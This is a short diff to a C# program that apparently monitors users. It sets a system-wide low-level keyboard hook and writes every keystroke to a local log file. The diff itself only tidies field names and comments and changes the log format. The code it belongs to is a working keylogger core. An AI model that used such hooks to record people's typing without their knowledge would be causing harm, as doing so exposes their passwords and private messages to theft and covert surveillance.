@@ -46,26 +46,24 @@ namespace userControlProgram
         private static InputLanguageCollection _installedInputLanguages;
 
         private static string _currentInputLanguage;
-        public static string LogPath;
+        private static string _logPath;
         private static string _logName;
 
         public static void SetHook(string logPath)
         {
-            LogPath = logPath;
-            _logName = LogPath + "\\log";
+            _logPath = logPath;
+            _logName = _logPath + "\\log";
             IntPtr hInstance = LoadLibrary("User32");
             _hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
         }
 
 
-
-
         public static void UnHook()
         {
-            // Снятие хука
             UnhookWindowsHookEx(_hhook);
         }
-        // Получение раскладки клавиатуры активного окна
+
+
         private static string GetKeyboardLayoutId()
         {
             _installedInputLanguages = InputLanguage.InstalledInputLanguages;
@@ -219,7 +217,7 @@ namespace userControlProgram
         private static void WriteLog (string key)
         {
             var logStream = new StreamWriter(_logName, true, Encoding.Default);
-            logStream.Write(key);
+            logStream.Write(key+"_");
             logStream.Close();
         }
     }
